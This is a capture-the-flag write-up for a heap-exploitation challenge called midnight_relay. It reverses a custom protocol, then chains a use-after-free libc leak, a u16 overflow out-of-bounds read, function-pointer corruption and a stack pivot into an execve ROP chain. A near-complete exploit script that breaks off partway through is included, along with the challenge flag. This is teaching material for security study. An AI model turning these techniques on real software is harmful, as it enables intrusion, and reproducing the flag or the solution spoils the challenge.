---
category: pwn
subcategory: heap
techniques:
  - use-after-free libc leak
  - u16 integer overflow OOB read
  - encoded function pointer corruption
  - leave;ret stack pivot
  - ROP execve
protections:
  - PIE
  - Full RELRO
  - NX
glibc: "2.39"
difficulty: hard
tags:
  - heap exploitation
  - custom protocol
  - stack pivot
  - UAF
  - integer overflow
summary: >
  Exploit a custom heap-manager binary by combining a UAF libc leak (unsorted bin),
  a u16 integer overflow OOB read, and encoded function-pointer corruption to pivot
  the stack into a ROP chain that calls execve("/bin/sh").
---

# BITSCTF 2026 — midnight_relay

**Flag:** `BITSCTF{m1dn1ght_r3l4y_m00nb3ll_st4t3_p1v0t}`

---

## Table of Contents

1. [Files Given](#1-files-given)
2. [Phase 1 — Recon](#2-phase-1--recon)
3. [Phase 2 — Protocol Reverse Engineering](#3-phase-2--protocol-reverse-engineering)
4. [Phase 3 — Slot Structure and the Fire Handler](#4-phase-3--slot-structure-and-the-fire-handler)
5. [Phase 4 — Finding the Vulnerabilities](#5-phase-4--finding-the-vulnerabilities)
6. [Phase 5 — Leaks](#6-phase-5--leaks)
7. [Phase 6 — The Exploit](#7-phase-6--the-exploit)
8. [Full Exploit Script](#8-full-exploit-script)
9. [Key Confusion Points and Lessons](#9-key-confusion-points-and-lessons)

---

## 1. Files Given

```
midnight_relay          # original binary (wrong libc path)
midnight_relay_patched  # patched to use the provided libc (use this one)
libc.so.6               # Ubuntu 24.04 glibc 2.39
ld-linux-x86-64.so.2    # dynamic linker
Dockerfile              # server setup
description.md          # protocol specification
flag.txt                # local test flag
```

The binary is patched with `pwninit` (or manually with `patchelf`) to use the provided libc instead of the system libc. Always use the patched binary.

```bash
# If you need to patch it yourself:
pwninit --bin midnight_relay --libc libc.so.6
# or manually:
patchelf --set-interpreter ./ld-linux-x86-64.so.2 midnight_relay
patchelf --set-rpath ./ midnight_relay
```

---

## 2. Phase 1 — Recon

**Mindset:** Before reading any assembly, collect every piece of free information. This gives your brain context so reversing is faster later.

### `file` — What kind of binary?

```bash
$ file midnight_relay
midnight_relay: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
                not stripped
```

| Output | Meaning |
|---|---|
| `64-bit` | Registers are rax, rdi, rsp etc. — 8 bytes each |
| `PIE` | Binary loads at a random base address every run — can't hardcode its addresses |
| `dynamically linked` | Uses a separate libc.so.6 — libc is also ASLR'd |
| `not stripped` | Symbol names preserved — function names visible in Ghidra |

### `checksec` — What security mitigations?

```bash
$ checksec --file=midnight_relay

Full RELRO   No canary found   NX enabled   PIE enabled
```

| Mitigation | Present | Implication for exploit |
|---|---|---|
| Full RELRO | Yes | GOT is read-only — can't overwrite function pointers in GOT |
| No Canary | **No** | Can overwrite return addresses on the stack directly |
| NX | Yes | Stack not executable — must use ROP, not shellcode |
| PIE | Yes | Binary at random address — need to leak an address first |

**The attack path:** No canary + NX = **ROP**. PIE + ASLR = need leaks first.

### `strings` — Free intelligence

```bash
$ strings midnight_relay
```

Key strings found:

```
free
calloc          ← uses calloc, not malloc — important for heap behaviour
memcpy
write
srand
open
read
/dev/urandom    ← reads randomness at startup
midnight-relay  ← banner the server prints
SOILEH          ← reversed: HELIOS — a magic constant
nus_owt         ← reversed: two_sun — another constant
idle            ← a function name: the default do-nothing function pointer
chall.c         ← source file name
```

`SOILEH` reversed = `HELIOS`. In ASCII hex: `48 45 4c 49 4f 53` → with `\x00\xff` appended = `0x48454c494f5300ff`. This is the magic integrity constant used in the footer, found later.

### Read the Dockerfile

```dockerfile
FROM pwn.red/jail:0.3.0
ENV JAIL_SYSCALLS=execve,execveat    ← ALLOWLIST, not blocklist

COPY midnight_relay /srv/app/run
COPY flag.txt /srv/app/flag.txt
COPY /bin/dash /srv/bin/dash
COPY /bin/cat  /srv/bin/cat
RUN ln -sf /bin/dash /srv/bin/sh
```

Critical observations:
- `pwn.red/jail` is a seccomp sandbox
- `JAIL_SYSCALLS=execve,execveat` is an **allowlist** — only these syscalls (plus basic I/O) are permitted. `fork` and `clone` are blocked.
- **You must use `execve`** — which replaces the current process with `/bin/sh`. No forking.
- `/bin/dash` and `/bin/cat` are available — a real shell works after execve.
- Flag is at `/srv/app/flag.txt` in the Dockerfile, but the actual container path resolves to `/app/flag.txt`.

### Read the Protocol Spec (`description.md`)

```
Packet format:  [op u8][key u8][len u16-LE][payload: len bytes]

key = 1-byte rolling checksum computed over payload using an internal epoch

Operations:
  0x11 forge:   idx | size(u16) | tag_len | tag   → allocates a buffer
  0x22 tune:    idx | off(u16)  | n(u16)  | blob  → writes into buffer at offset
  0x33 observe: idx | off(u16)  | n(u16)          → reads n bytes from buffer
  0x44 shred:   idx                               → frees the buffer
  0x55 sync:    idx | token(u32)                  → arms the slot with a token
  0x66 fire:    idx                               → calls a stored function pointer
```

**Mental model:** A memory manager with 16 numbered slots. Each slot can hold a buffer. `fire` is suspicious — it "calls a stored function pointer". That's your exploitation target.

### Run the binary

```bash
$ ./midnight_relay_patched
midnight-relay
[hangs, reading from stdin]
```

It prints the banner and waits for TCP packets on stdin. Send garbage — it's silently dropped (bad key). The protocol must be spoken correctly.

---

## 3. Phase 2 — Protocol Reverse Engineering

**Mindset:** You cannot test anything until you can send valid packets. Reverse the checksum algorithm from the binary before writing a single line of exploit code.

### Find the checksum loop in Ghidra

Open the binary in Ghidra. Go to `main`. After the `readn` call, find this loop:

```c
pbVar7 = __ptr;
uVar6   = epoch;           // epoch is a global variable at 0x104010
do {
    uVar6 = uVar6 * 8 ^ uVar6 >> 2 ^ (uint)*pbVar7 ^ 0x71;
    pbVar7 = pbVar7 + 1;
} while (__ptr + local_42 != pbVar7);

if (local_43 == (char)uVar6)   // local_43 = the key byte from the packet
    goto handle_command;
// else: fall through to free(__ptr) and loop again — silent drop
```

In assembly, each iteration:

```asm
001012e8: LEA EAX, [RDX*8]        ; EAX = h * 8
001012ef: SHR EDX, 0x2             ; EDX = h >> 2
001012f6: XOR EAX, EDX             ; EAX = (h*8) ^ (h>>2)
001012f8: MOVZX EDX, byte [RCX-1]  ; EDX = current byte
001012fc: XOR EAX, EDX             ; EAX ^= byte
001012fe: XOR EAX, 0x71            ; EAX ^= 0x71
00101301: MOV EDX, EAX             ; h = result (for next iteration)
```

Translated to Python:

```python
def compute_key(payload, epoch):
    h = epoch & 0xFFFFFFFF
    for b in payload:
        h = ((h * 8) ^ (h >> 2) ^ b ^ 0x71) & 0xFFFFFFFF
    return h & 0xFF
```

The `& 0xFFFFFFFF` keeps it 32-bit (matching the C code's use of 32-bit registers EAX/EDX).

### Find the epoch update

After every successfully processed command, look for where the global `epoch` is written:

```c
// At label LAB_00101456 — runs after every valid command
epoch = epoch ^ ((uint)bVar4 << 9 | 0x5f);
```

In assembly:

```asm
00101456: MOVZX EAX, R13B      ; EAX = op (the command byte e.g. 0x11, 0x33...)
0010145a: SHL EAX, 0x9         ; EAX = op << 9
0010145d: OR EAX, 0x5f         ; EAX |= 0x5f
00101460: XOR [0x00104010], EAX ; epoch ^= EAX
```

Python:

```python
def epoch_update(epoch, op):
    return (epoch ^ ((op << 9) | 0x5f)) & 0xFFFFFFFF
```

**Important:** The epoch only updates on *successful* commands. If a packet is dropped (bad key), the server does NOT update epoch — and neither should you.

### Find the initial epoch

The epoch global is at `0x104010`. Search the binary file for its initial value:

```bash
$ python3 -c "
import struct
with open('midnight_relay', 'rb') as f:
    data = f.read()
target = struct.pack('<I', 0x6b1d5a93)
offset = data.find(target)
print(f'found at file offset {hex(offset)}')
"
# Output: found at file offset 0x3010
```

The value `0x6b1d5a93` is baked into the `.data` section. It is the starting epoch.

### Edge case: zero-length payload

```c
if (uVar15 == 0) {    // pkt.len == 0
    if (local_43 == (char)epoch)   // key must equal epoch & 0xFF directly
        goto handle_command;
}
```

For zero-length packets, the key is just `epoch & 0xFF` (no hashing). In practice, all commands have payloads so this doesn't matter for the exploit.

### The complete packet builder

```python
import struct

EPOCH_INIT = 0x6b1d5a93

def compute_key(payload, epoch):
    h = epoch & 0xFFFFFFFF
    for b in payload:
        h = ((h * 8) ^ (h >> 2) ^ b ^ 0x71) & 0xFFFFFFFF
    return h & 0xFF

def make_packet(op, payload, epoch):
    payload = bytes(payload)
    key = compute_key(payload, epoch) if len(payload) > 0 else (epoch & 0xFF)
    return struct.pack('<BBH', op, key, len(payload)) + payload

def epoch_update(epoch, op):
    return (epoch ^ ((op << 9) | 0x5f)) & 0xFFFFFFFF

class State:
    def __init__(self):
        self.epoch = EPOCH_INIT

    def send(self, r, op, payload):
        r.send(make_packet(op, bytes(payload), self.epoch))
        self.epoch = epoch_update(self.epoch, op)
```

### Verify it works

```python
from pwn import *

r = process('./midnight_relay_patched')
r.recvuntil(b'midnight-relay\n')
s = State()

# forge(idx=0, size=0x80): payload = [idx][size_lo][size_hi][tag_len]
s.send(r, 0x11, bytes([0x00]) + struct.pack('<H', 0x80) + bytes([0x00]))

# observe(idx=0, off=0, n=8): payload = [idx][off_lo][off_hi][n_lo][n_hi]
s.send(r, 0x33, bytes([0x00]) + struct.pack('<HH', 0, 8))

data = r.recvn(8)
print(f'Got: {data.hex()}')
# Should print 8 null bytes — freshly calloc'd memory is zeroed
```

---

## 4. Phase 3 — Slot Structure and the Fire Handler

**Mindset:** Ask one question at a time and follow the data. You don't need to understand the whole binary at once.

### The slots array

Located at `0x104080` (found via Ghidra's global variable list). From how the forge handler indexes it:

```c
lVar8 = (long)(idx & 0xf) * 0x10;   // each slot = 16 bytes
slots[lVar8 + 0x00]                  // ptr    (8 bytes) — pointer to buffer
slots[lVar8 + 0x08]                  // size   (2 bytes) — requested size
slots[lVar8 + 0x0a]                  // active (1 byte)  — 0=idle, 1=armed
// 5 bytes padding
```

16 slots × 16 bytes = 256 bytes total.

### The forge handler — what memory looks like after forge

Full decompiled logic:

```c
// op = 0x11, payload = [idx][size u16][tag_len][tag...]
// Constraint: 0x80 <= size <= 0x520
pbVar7 = (byte *)calloc(1, (ulong)size + 0x20);  // allocate size + 32 bytes
slots[idx].ptr    = pbVar7;
slots[idx].size   = size;
slots[idx].active = 0;

// Copy tag into the start of the buffer
memcpy(pbVar7, tag, tag_len);

// Build the 32-byte FOOTER at ptr + size
footer = (ulong *)(pbVar7 + size);

footer[0] = (footer_addr >> 12) ^ cookie ^ 0x48454c494f5300ff;  // integrity
footer[1] = (footer_addr >> 13) ^ idle_ptr ^ footer[0] ^ footer[3]; // encoded fn_ptr
footer[2] = (ulong)pbVar7;         // self-reference = heap address
footer[3] = ((ulong)rand() << 32) ^ (ulong)rand();  // random token
```

Memory layout after `forge(0, 0x520)`:

```
  buf_ptr  →  ┌────────────────────────────────┐
              │    user data  (0x520 bytes)    │   ← you read/write here with observe/tune
  footer_addr →├────────────────────────────────┤  = buf_ptr + 0x520
              │  footer[0]  integrity check    │  8 bytes  ← do NOT touch
              │  footer[1]  encoded fn_ptr     │  8 bytes  ← ATTACK TARGET
              │  footer[2]  = buf_ptr (self)   │  8 bytes  ← heap leak
              │  footer[3]  random token       │  8 bytes  ← needed for sync token
              └────────────────────────────────┘
                  calloc(1, 0x520 + 0x20) = calloc(1, 0x540)
                  chunk size = 0x550
```

Key formulas:

```
footer[0] = (footer_addr >> 12) ^ cookie ^ 0x48454c494f5300ff
footer[1] = (footer_addr >> 13) ^ idle_ptr ^ footer[0] ^ footer[3]
footer[2] = buf_ptr
footer[3] = random
```

### The fire handler — line by line

```c
// op = 0x66, payload = [idx][...]
idx      = *__ptr & 0xf;
slot_ptr = slots[idx].ptr;

// Guard 1: slot must exist
if (slot_ptr == 0) bail;

// Guard 2: slot must be synced (armed)
if (slots[idx].active == 0) bail;

footer_addr = slot_ptr + slot_size;

// Guard 3: integrity check
if (footer[0] != (footer_addr>>12 ^ cookie ^ MAGIC)) bail;

// Guard 4: self-pointer check
if (slot_ptr != footer[2]) bail;

// Decode function pointer
fn_ptr = (footer_addr >> 13) ^ footer[0] ^ footer[1] ^ footer[3];

// Call it
(*fn_ptr)();
```

Assembly of the decode + call:

```asm
001014ef: XOR RDX, [RAX + 0x08]   ; RDX ^= footer[1]  (the one you corrupt)
001014f3: XOR RDX, [RAX + 0x18]   ; RDX ^= footer[3]
001014f7: SHR RAX, 0xd             ; RAX = footer_addr >> 13
001014fb: XOR RAX, RDX             ; RAX = (addr>>13) ^ footer[0] ^ footer[1] ^ footer[3]
001014fe: CALL RAX                 ; call decoded fn_ptr
```

**The insight:** By default `footer[1]` is set so that `fn_ptr` decodes to `idle()` — a do-nothing function. Your goal: overwrite `footer[1]` so that `fn_ptr` decodes to `leave ; ret` instead.

To encode an arbitrary target into `footer[1]`:

```
fn_ptr = (footer_addr>>13) ^ footer[0] ^ footer[1] ^ footer[3]

Rearrange to solve for footer[1]:
footer[1] = (footer_addr>>13) ^ footer[0] ^ footer[3] ^ fn_ptr
```

### The observe handler

```c
// op = 0x33, payload = [idx][off u16][n u16]
if (slot_ptr != 0) {
    if ((ushort)(off + n) <= (ushort)(slot_size + 0x20)) {
        write(1, slot_ptr + off, n);
    }
}
```

The `+0x20` in the bounds check allows reading the 32-byte footer: `observe(idx, slot_size, 0x20)` passes because `(ushort)(slot_size + 0x20) <= (ushort)(slot_size + 0x20)`.

Note: **no check that the slot is still alive**. Used for the UAF leak later.

### The tune handler

```c
// op = 0x22, payload = [idx][off u16][n u16][blob]
if (slot_ptr != 0) {
    if ((ushort)(off + n) <= (ushort)(slot_size + 0x20)) {
        if ((ushort)(n + 5) <= pkt_len) {
            memcpy(slot_ptr + off, blob, n);
        }
    }
}
```

Same bounds check as observe. `tune(0, slot_size + 8, 8_bytes)` writes into `footer[1]`.

### The shred handler

```c
// op = 0x44, payload = [idx]
if (slot_ptr != 0) {
    free(slot_ptr);
    slots[idx].active = 0;
    // ← slots[idx].ptr is NOT zeroed ← UAF bug
}
```

### The sync handler

```c
// op = 0x55, payload = [idx][token u32]
footer = (uint *)(slot_ptr + slot_size);

// token check
if (packet_token == (epoch ^ footer[0]_lo32 ^ footer[3]_lo32)) {
    slots[idx].active = 1;   // arm the slot
}
```

`footer[0]_lo32` = lower 32 bits of `footer[0]`. `footer[3]_lo32` = lower 32 bits of `footer[3]` (at footer+24 = `puVar13[6]` since it's indexed as a `uint*`).

---

## 5. Phase 4 — Finding the Vulnerabilities

**Mindset:** For every handler, ask four questions:
1. Does it check bounds correctly?
2. Does it check object state correctly (alive/freed/initialized)?
3. Does it handle integer arithmetic safely (overflow/wrap)?
4. Does it check both before AND after the operation?

### Bug 1 — Use-After-Free (shred + observe)

```c
// shred:
free(slot_ptr);
slots[idx].active = 0;
// ← ptr NOT zeroed
```

```c
// observe:
if (slot_ptr != 0) {   // ← passes even after shred (ptr still set)
    write(1, slot_ptr + off, n);
}
```

After shred, `slots[idx].ptr` still points to freed heap memory. `observe` on the freed slot reads raw heap contents.

**Why this gives a libc leak:** When glibc frees a chunk that is too large for tcache (> `0x408` bytes), it goes to the **unsorted bin** — a doubly-linked list in `main_arena`. Glibc writes two pointers into the first 16 bytes of the freed chunk's user data:

```
freed_chunk + 0x00 = fd  →  main_arena + 0x60  (inside libc)
freed_chunk + 0x08 = bk  →  main_arena + 0x60  (inside libc)
```

Reading those values with observe after shred gives you a libc pointer.

### Bug 2 — u16 Integer Overflow (observe/tune bounds check)

```c
if ((ushort)(off + n) <= (ushort)(slot_size + 0x20)) {
    write(1, slot_ptr + off, n);
}
```

Both `off` and `n` are `u16` (0–65535). The addition `off + n` is done as `u16` — it wraps at `0x10000`.

Example with `off = 0x0540`, `n = 0xFAC0`:

```
(ushort)(0x0540 + 0xFAC0) = (ushort)(0x10000) = 0x0000
(ushort)(0x0520 + 0x0020) = 0x0540

0x0000 <= 0x0540  →  TRUE  ← bounds check passes
```

But the actual `write` syscall uses the full untruncated values:

```c
write(1, slot_ptr + 0x540, 0xFAC0);   // reads 64KB of heap
```

**This gives an OOB read of 64192 bytes** past the slot — reaching into adjacent heap chunks, freed chunks with libc pointers, etc.

Same overflow exists in tune — giving OOB write access.

### Finding these bugs in practice

**For integer overflow bugs:** Every time you see `if (X <= Y)` guarding a memory operation, write out the arithmetic with the *actual types*. Ask: can `X` wrap? Can `Y` be manipulated?

**For UAF bugs:** Every time you see `free()`, immediately check whether the pointer is set to NULL everywhere it's stored. If not — UAF.

### Dynamic analysis with pwndbg — verifying the bugs

```bash
# Start the binary under pwndbg
$ gdb ./midnight_relay_patched
gdb> run

# In another terminal, send a forge + shred:
python3 -c "
from pwn import *
import struct
EPOCH=0x6b1d5a93
def ck(p,e):
    h=e&0xFFFFFFFF
    for b in p: h=((h*8)^(h>>2)^b^0x71)&0xFFFFFFFF
    return h&0xFF
def mk(op,p,e): p=bytes(p); return struct.pack('<BBH',op,ck(p,e),len(p))+p
def up(op,e): return (e^((op<<9)|0x5f))&0xFFFFFFFF
r=process('./midnight_relay_patched')
r.recvuntil(b'midnight-relay\n')
e=EPOCH
p=bytes([0])+struct.pack('<H',0x500)+bytes([0])
r.send(mk(0x11,p,e)); e=up(0x11,e)   # forge slot0 (size 0x500)
p=bytes([0])+struct.pack('<H',0x80)+bytes([0])
r.send(mk(0x11,p,e)); e=up(0x11,e)   # forge slot1 (guard)
p=bytes([0])
r.send(mk(0x44,p,e)); e=up(0x44,e)   # shred slot0
import time; time.sleep(0.5)
print('PID:', r.pid)
r.interactive()
"
```

Then in pwndbg:

```
gdb> attach <PID>

# Check the slots array
gdb> x/32gx &slots
# slots[0].ptr should still point to freed memory

# Check heap bins — the freed chunk should be in unsorted bin
gdb> heap bins
gdb> bins

# Examine the freed chunk — should see libc pointers at fd/bk
gdb> x/4gx <slot0_ptr>
# Output: 0x7f...b20  0x7f...b20  (fd and bk = main_arena+0x60 = libc pointer)

# Verify: is the pointer zeroed after shred?
gdb> x/gx &slots    # first 8 bytes = slot0.ptr — NOT zero, still points to freed memory
```

---

## 6. Phase 5 — Leaks

**Goal:** Extract four values needed before building the exploit.

```
buf_ptr   → heap address (know where your ROP chain lives)
pie_base  → binary load address (not needed for this exploit — all gadgets from libc)
cookie    → the random integrity secret (not needed — we don't touch footer[0])
libc_base → libc load address (all ROP gadgets are here)
```

### Leak 1+2+3: Footer read

```python
SLOT0_SIZE = 0x520

# Forge a large slot
s.send(r, 0x11, bytes([0]) + struct.pack('<H', SLOT0_SIZE) + bytes([0]))
sleep(0.05)

# Observe the 32-byte footer at offset SLOT0_SIZE
# Bounds check: (ushort)(0x520 + 0x20) <= (ushort)(0x520 + 0x20) → passes normally
s.send(r, 0x33, bytes([0]) + struct.pack('<HH', SLOT0_SIZE, 0x20))
meta = r.recvn(0x20)
sleep(0.05)

f0, f1, f2, f3 = struct.unpack('<4Q', meta)

buf_ptr     = f2                          # footer[2] = direct heap address
footer_addr = buf_ptr + SLOT0_SIZE        # = buf_ptr + 0x520

# Decode idle_ptr from footer[1]:
# f1 = (footer_addr>>13) ^ idle_ptr ^ f0 ^ f3
# → idle_ptr = (footer_addr>>13) ^ f1 ^ f0 ^ f3
idle_ptr    = (footer_addr >> 13) ^ f0 ^ f1 ^ f3
pie_base    = idle_ptr - 0x17b0           # idle() is at binary offset 0x17b0

# Decode cookie from footer[0]:
# f0 = (footer_addr>>12) ^ cookie ^ MAGIC
MAGIC       = 0x48454c494f5300ff
cookie      = f0 ^ (footer_addr >> 12) ^ MAGIC
```

Verify:

```python
assert pie_base & 0xfff == 0, f"PIE base misaligned: {hex(pie_base)}"
```

### Leak 4: libc from unsorted bin

```python
# Forge a large chunk (size 0x500 → calloc(1, 0x520) → chunk size 0x530 > 0x408 → unsorted bin)
s.send(r, 0x11, bytes([1]) + struct.pack('<H', 0x500) + bytes([0]))
sleep(0.05)

# Guard chunk — prevents slot1 from merging with the top chunk when freed
s.send(r, 0x11, bytes([2]) + struct.pack('<H', 0x80) + bytes([0]))
sleep(0.05)

# Free slot1 → 0x530 chunk goes to unsorted bin → fd/bk = main_arena+0x60
s.send(r, 0x44, bytes([1]))
sleep(0.05)

# OOB read via u16 overflow:
# off=0x540, n=0xFAC0 → (ushort)(0x540 + 0xFAC0) = 0x0000 <= 0x0540 → passes!
# reads 64KB of heap starting at slot0_ptr + 0x540
s.send(r, 0x33, bytes([0]) + struct.pack('<HH', 0x540, 0xFAC0))
dump = r.recvn(0xFAC0)
sleep(0.05)

# Scan for libc pointer: main_arena+0x60 always ends in 0xb20 (low 12 bits fixed by ASLR)
UNSORTED_OFF = 0x203b20    # main_arena + 0x60 (libc.sym['main_arena'] + 0x60)
expected_lo12 = UNSORTED_OFF & 0xFFF   # = 0xb20

fd_leak = None
for i in range(0, min(0x2000, len(dump) - 7), 8):
    val = u64(dump[i:i+8])
    if val > 0x10000 and val < (1 << 48) and (val & 0xFFF) == expected_lo12:
        fd_leak = val
        break

libc_base = fd_leak - UNSORTED_OFF
assert libc_base & 0xfff == 0, f"libc_base misaligned: {hex(libc_base)}"
```

**Why scan only the first `0x2000` bytes?** The freed slot1 chunk is adjacent to slot0 in the heap (allocated right after). The OOB read starts at `slot0_ptr + 0x540` (just past slot0's footer). Slot1's chunk starts shortly after — within the first few KB of the dump.

**How to find gadget offsets:**

```bash
# Find all needed gadgets
$ ROPgadget --binary libc.so.6 2>/dev/null | grep ": leave ; ret$"
0x00000000000299d2 : leave ; ret

$ ROPgadget --binary libc.so.6 2>/dev/null | grep ": pop rdi ; ret$"
0x000000000010f78b : pop rdi ; ret

$ ROPgadget --binary libc.so.6 2>/dev/null | grep ": pop rsi ; ret$"
0x0000000000110a7d : pop rsi ; ret

$ ROPgadget --binary libc.so.6 2>/dev/null | grep ": pop rax ; ret$"
0x00000000000dd237 : pop rax ; ret

# xor edx,edx zeros rdx without needing a stack value (cleaner than pop rdx + p64(0))
$ ROPgadget --binary libc.so.6 2>/dev/null | grep "xor edx, edx" | grep "mov eax, edx"
0x00000000000b5dd0 : xor edx, edx ; mov eax, edx ; ret

# bare syscall (no ret) — execve replaces the process, ret is never reached
$ ROPgadget --binary libc.so.6 2>/dev/null | grep ": syscall$"
0x00000000000288b5 : syscall

# /bin/sh string
$ strings -a -t x libc.so.6 | grep "/bin/sh"
  1cb42f /bin/sh

# main_arena offset (to compute UNSORTED_OFF)
$ python3 -c "from pwn import *; l=ELF('./libc.so.6',checksec=False); print(hex(l.sym['main_arena']+0x60))"
0x203b20
```

### Verifying leaks with pwndbg

```bash
$ gdb ./midnight_relay_patched
gdb> break *0x401500    # break somewhere after leaks are sent
gdb> run

# After getting leak values in your script, attach and verify:
gdb> p/x libc_base
gdb> info proc mappings   # check libc is loaded at that base
gdb> x/s libc_base + 0x1cb42f   # should print /bin/sh
```

---

## 7. Phase 6 — The Exploit

### Stage 1: Understand the stack pivot

Look at `main`'s assembly around the calloc call:

```asm
00101299: CALL calloc              ; allocate packet buffer
0010129e: MOV RBP, RAX             ; ← RBP = __ptr  (the packet buffer address)
...
001014fe: CALL RAX                 ; call decoded fn_ptr
```

The key line is `MOV RBP, RAX` at `0x129e` — every time the loop allocates a buffer, RBP points to it. By the time `CALL RAX` fires, **RBP = the address of the fire packet's payload buffer**.

If you set `fn_ptr = leave ; ret`:

```
leave = MOV RSP, RBP   ; RSP = RBP = __ptr
      + POP RBP        ; rbp = __ptr[0..7] (first 8 bytes, don't care)
                       ; RSP = __ptr + 8
ret   = POP RIP        ; rip = __ptr[8..15] (FIRST ROP GADGET)
                       ; RSP = __ptr + 16
```

Your fire packet's payload **becomes the stack**. From byte 8 onwards = your ROP chain.

### Stage 2: Corrupt footer[1]

Rearrange the fn_ptr decode formula to solve for the `footer[1]` value you need:

```python
# fn_ptr = (footer_addr>>13) ^ footer[0] ^ footer[1] ^ footer[3]
# Solve for footer[1]:
# footer[1] = (footer_addr>>13) ^ footer[0] ^ footer[3] ^ fn_ptr

LEAVE_RET   = 0x299d2
leave_ret   = libc_base + LEAVE_RET
new_footer1 = (footer_addr >> 13) ^ f0 ^ f3 ^ leave_ret

# Write it at slot0_ptr + SLOT0_SIZE + 8  (= footer_addr + 8 = offset of footer[1])
s.send(r, 0x22, bytes([0]) + struct.pack('<HH', SLOT0_SIZE + 8, 8) + struct.pack('<Q', new_footer1))
sleep(0.05)
```

Verify the decode manually:

```python
decoded = (footer_addr >> 13) ^ f0 ^ new_footer1 ^ f3
assert decoded == leave_ret, f"footer[1] decode wrong: {hex(decoded)} != {hex(leave_ret)}"
```

### Stage 3: Arm the slot (sync)

```python
# token = epoch ^ footer[0]_lo32 ^ footer[3]_lo32
# epoch here = current epoch AFTER the tune packet was processed
token = (s.epoch ^ (f0 & 0xFFFFFFFF) ^ (f3 & 0xFFFFFFFF)) & 0xFFFFFFFF
s.send(r, 0x55, bytes([0]) + struct.pack('<I', token))
sleep(0.05)
```

**Order:** tune first, then sync. The token formula uses your tracked epoch at the moment sync is sent. The server's epoch at that moment equals yours (both updated by the tune packet). As long as epoch tracking is accurate, the token computes correctly.

### Stage 4: Build the ROP chain

execve("/bin/sh", NULL, NULL) via raw syscall:

```python
# Gadget addresses
POP_RDI     = libc_base + 0x10f78b   # pop rdi ; ret
POP_RSI     = libc_base + 0x110a7d   # pop rsi ; ret
XOR_EDX_RET = libc_base + 0x0b5dd0   # xor edx,edx ; mov eax,edx ; ret
POP_RAX     = libc_base + 0x0dd237   # pop rax ; ret
SYSCALL     = libc_base + 0x0288b5   # syscall  (no ret)
BINSH       = libc_base + 0x1cb42f   # "/bin/sh\0"

# ROP chain: execve("/bin/sh", 0, 0)
rop  = p64(POP_RDI)     + p64(BINSH)   # rdi = "/bin/sh"
rop += p64(POP_RSI)     + p64(0)       # rsi = NULL
rop += p64(XOR_EDX_RET)                # rdx = 0  (no extra stack slot needed)
rop += p64(POP_RAX)     + p64(59)      # rax = SYS_execve = 59
rop += p64(SYSCALL)                    # syscall → execve replaces process
```

Why `XOR_EDX_RET` instead of `pop rdx ; ret`?
- `pop rdx ; ret` would need a `p64(0)` value on the stack after it
- `xor edx, edx` zeroes rdx inline with no stack value needed — slightly cleaner

Why `syscall` with no `ret`?
- `execve` never returns on success — it replaces the process image
- The `ret` instruction after `syscall` would be unreachable

### Stage 5: Build and send the fire payload

```python
# fire_payload layout in __ptr (the calloc'd packet buffer):
#
# __ptr[0x00] = 0x00   ← slot idx (first byte consumed by fire handler)
# __ptr[0x00..0x07]    ← fake rbp (popped by leave, then discarded)
# __ptr[0x08.....]     ← ROP chain  (RSP lands here after leave;ret)

fire_payload = p64(0) + rop    # p64(0): first byte = idx 0, rest = fake rbp padding

s.send(r, 0x66, fire_payload)
sleep(0.05)
```

Memory layout of `__ptr` at execution time:

```
__ptr + 0x00: 00 00 00 00 00 00 00 00  ← [0]=slot_idx=0, [1..7]=fake rbp padding
__ptr + 0x08: [pop rdi addr]           ← RSP lands here after leave;ret
__ptr + 0x10: [/bin/sh addr]
__ptr + 0x18: [pop rsi addr]
__ptr + 0x20: 00 00 00 00 00 00 00 00  ← 0 for rsi
__ptr + 0x28: [xor edx ret addr]
__ptr + 0x30: [pop rax addr]
__ptr + 0x38: 3b 00 00 00 00 00 00 00  ← 59 = SYS_execve
__ptr + 0x40: [syscall addr]
```

### Stage 6: Get the flag

```python
r.sendline(b"cat /app/flag*")
flag = r.recvall(timeout=5)
print(flag.decode())
```

### Verifying the pivot with pwndbg

```bash
$ gdb ./midnight_relay_patched
gdb> break *0x1014fe    # CALL RAX — the moment fn_ptr is called
gdb> run

# When it breaks:
gdb> info registers
# rax = leave_ret address? Good.
# rbp = __ptr? Good.

gdb> x/gx $rbp          # should show the fire payload bytes
gdb> x/10gx $rbp        # see the whole ROP chain

gdb> stepi              # step into leave;ret
gdb> info registers
# rsp should now equal old rbp (__ptr)

gdb> x/gx $rsp          # should be 0 (fake rbp)
gdb> x/gx $rsp+8        # should be pop_rdi gadget address

gdb> continue           # let execve run
gdb> # process should be replaced by /bin/sh
```

---

## 8. Full Exploit Script

```python
#!/usr/bin/env python3

from pwn import *
import struct
import time

exe  = ELF("./midnight_relay_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = exe
context.arch = 'amd64'

# ── Libc gadget offsets ───────────────────────────────────────────────────────
LEAVE_RET    = 0x299d2   # leave ; ret
POP_RDI      = 0x10f78b  # pop rdi ; ret
POP_RSI      = 0x110a7d  # pop rsi ; ret
XOR_EDX_RET  = 0xb5dd0   # xor edx,edx ; mov eax,edx ; ret
POP_RAX      = 0xdd237   # pop rax ; ret
SYSCALL      = 0x288b5   # syscall  (no ret)
BINSH        = 0x1cb42f  # "/bin/sh\0"
UNSORTED_OFF = 0x203b20  # main_arena + 0x60

# ── Protocol ─────────────────────────────────────────────────────────────────
EPOCH_INIT = 0x6b1d5a93

def compute_key(payload, epoch):
    h = epoch & 0xFFFFFFFF
    for b in payload:
        h = ((h * 8) ^ (h >> 2) ^ b ^ 0x71) & 0xFFFFFFFF
    return h & 0xFF

def make_packet(op, payload, epoch):
    payload = bytes(payload)
    key = compute_key(payload, epoch) if len(payload) > 0 else (epoch & 0xFF)
    return struct.pack('<BBH', op, key, len(payload)) + payload

def epoch_update(epoch, op):
    return (epoch ^ ((op << 9) | 0x5f)) & 0xFFFFFFFF

class State:
    def __init__(self):
        self.epoch = EPOCH_INIT

    def send(self, r, op, payload):
        r.send(make_packet(op, bytes(payload), self.epoch))
        self.epoch = epoch_update(self.epoch, op)

    def forge(self, r, idx, size):
        self.send(r, 0x11, bytes([idx & 0xf]) + struct.pack('<H', size) + bytes([0]))

    def observe(self, r, idx, off, n):
        self.send(r, 0x33, bytes([idx & 0xf]) + struct.pack('<HH', off, n))

    def shred(self, r, idx):
        self.send(r, 0x44, bytes([idx & 0xf]))

    def sync(self, r, idx, token):
        self.send(r, 0x55, bytes([idx & 0xf]) + struct.pack('<I', token & 0xFFFFFFFF))

    def tune(self, r, idx, off, data):
